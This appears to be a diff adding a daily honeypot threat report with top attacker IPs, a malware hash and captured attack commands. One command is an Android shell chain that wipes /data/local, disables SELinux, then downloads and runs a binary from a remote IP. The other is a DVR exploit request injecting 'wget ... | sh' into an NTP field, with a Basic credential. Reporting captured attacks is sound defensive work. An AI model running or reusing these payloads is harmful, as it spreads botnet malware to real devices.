@@ -1,0 +1,24 @@
+Top 5 IPs for 2024-02-25 :
+
+75.111.120.123
+37.14.85.36
+110.7.52.148
+190.0.236.232
+59.127.97.53
+
+Malware Download:
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+Malcious Commands seen:
+
+attacker IP : 103.67.196.50
+toybox pgrep -a M arm arm7 x86 x86_64 | toybox xargs toybox kill -9;su 0 toybox pgrep -a M arm arm7 x86 x86_64 | su 0 toybox xargs toybox kill -9;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://103.28.33.96/and || su 0 busybox wget http://103.28.33.96/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+POST /cn/cmd HTTP/1.1
+nHost: HOSTIP
+Accept-Encoding: gzip, deflate
+Content-Length: 336
+Authorization: Basic cm9vdDppY2F0Y2g5OQ==
+User-Agent: Abcd\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&wget -O- http://37.44.238.70/beastmode.sh|sh;echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>
+
